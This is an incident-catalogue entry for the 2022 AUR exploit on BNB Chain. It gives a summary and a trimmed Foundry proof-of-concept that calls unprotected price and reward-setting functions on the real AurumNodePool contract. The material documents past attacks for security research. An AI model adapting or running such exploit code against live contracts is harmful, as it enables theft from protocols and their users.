# [?] - AUR - Lack of Permission Check

## Summary
Severity: Unknown
Chain: BNB Chain
Component: AUR
Published: 2022-11-22
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/AUR_exp.sol
Type: defi-exploit-poc

## Details
Lost: $13k
References:
- https://twitter.com/AnciliaInc/status/1595142246570958848
- https://phalcon.blocksec.com/tx/bsc/0xb3bc6ca257387eae1cea3b997eb489c1a9c208d09ec4d117198029277468e25d
- https://phalcon.blocksec.com/tx/bsc/0x7f031e8543e75bd5c85168558be89d2e08b7c02a32d07d76517cdbb10e279782

```solidity
contract ContractTest is Test {
    IERC20 AUR = IERC20(0x73A1163EA930A0a67dFEFB9C3713Ef0923755B78);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    IAurumNodePool AurumNodePool = IAurumNodePool(0x70678291bDDfd95498d1214BE368e19e882f7614);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23_282_134);
        cheats.deal(address(this), 0.01 ether);
    }

    function testExploit() public {
        AUR.approve(address(AurumNodePool), type(uint256).max);
        AUR.approve(address(Router), type(uint256).max);

        emit log_named_decimal_uint("[Start] Attacker BNB balance before exploit", address(this).balance, 18);

        BNBtoAUR(0.01 ether);

        AurumNodePool.changeNodePrice(1_000_000_000_000_000_000_000);
        AurumNodePool.createNode(1);

        IAurumNodePool.NodeEntity[] memory nodes = AurumNodePool.getNodes(address(this));

        cheats.roll(23_282_171);
        cheats.warp(1_669_141_486);

        AurumNodePool.changeRewardPerNode(434_159_898_144_856_792_986_061_626_032);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/AUR_exp.sol_
